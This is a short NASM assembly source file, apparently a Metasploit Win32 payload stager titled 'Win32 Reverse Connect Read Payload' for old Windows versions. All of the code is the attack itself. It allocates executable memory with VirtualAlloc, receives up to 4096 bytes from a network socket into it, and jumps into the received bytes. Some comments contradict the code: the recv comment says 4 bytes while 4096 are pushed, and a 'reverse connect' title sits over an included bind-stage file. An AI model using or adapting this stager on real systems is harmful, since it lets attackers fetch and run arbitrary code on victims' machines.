;      Title:  Win32 Reverse Connect Read Payload
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com



[BITS 32]

%include "win32_stage_boot_bind.asm"

LAllocateMemory: ; VirtualAlloc(NULL,size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)

	push byte      0x40
	pop esi
	push esi                ; PAGE_EXECUTE_READWRITE=0x40

	shl esi, 6              ; MEM_COMMIT=0x1000
	push esi

	shl esi, 8              ; 1MB
	push esi
	
	push byte      0x00     ; NULL
	call [ebp+12]
	mov ebx, eax
	

LRecvLength: ; recv(s, buff, 4, 0)
    push byte 0x00          ; flags
    push 4096               ; length
    push ebx                ; buffer
    push dword edi          ; socket
    call FN_RECV            ; recv()
    call ebx
